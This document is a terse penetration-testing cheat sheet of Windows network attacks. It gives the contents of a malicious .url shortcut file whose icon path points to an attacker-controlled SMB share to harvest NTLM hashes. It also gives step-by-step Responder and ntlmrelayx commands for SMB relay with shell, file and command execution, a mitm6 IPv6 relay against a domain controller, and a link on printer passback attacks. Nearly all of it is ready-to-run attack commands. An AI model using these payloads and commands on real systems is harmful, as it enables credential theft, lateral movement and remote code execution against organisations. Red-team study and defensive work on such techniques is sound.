## URL FILE ATTACK:  
1) Payload file:  
[InternetShortcut]  
URL=blah  
WorkingDirectory=blah  
IconFile=\\x.x.x.x\%USERNAME%.icon  
IconIndex=1  

2) Rename file: @payload  

## SMB Relay:  
1) Update responder config: nano -w /etc/responder/Responder.conf, turn off SMB and HTTP.  
2) Run responder: responder -I eth0 -rdwv  
3) Opennew tab and run ntlmrelayx.py -tf [file with IP] -smb2support  
4) Interactive shell: ntlmrelayx.py -tf [file with IP] -smb2support -i Clarify: list shares and use $[share name]  
5) Execute file: ntlmrelayx.py -tf [file with IP] -smb2support -e [filename]  
6) Execute command: ntlmrelayx.py -tf [file with IP] -smb2support -c "whoami"  

## IPv6 Attacks:  
1) Install https://github.com/dirkjanm/mitm6.git  
2) Run mitm6 -d [domain name]  
3) Open new tab and run: ntlmrelayx.py -6 -t ldaps://[DC ip] -wh fakewpad.domain_name.local -l loot  
Resource for read: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/  

## PASSBACK ATTACK (Printers and IoT):  
https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack  

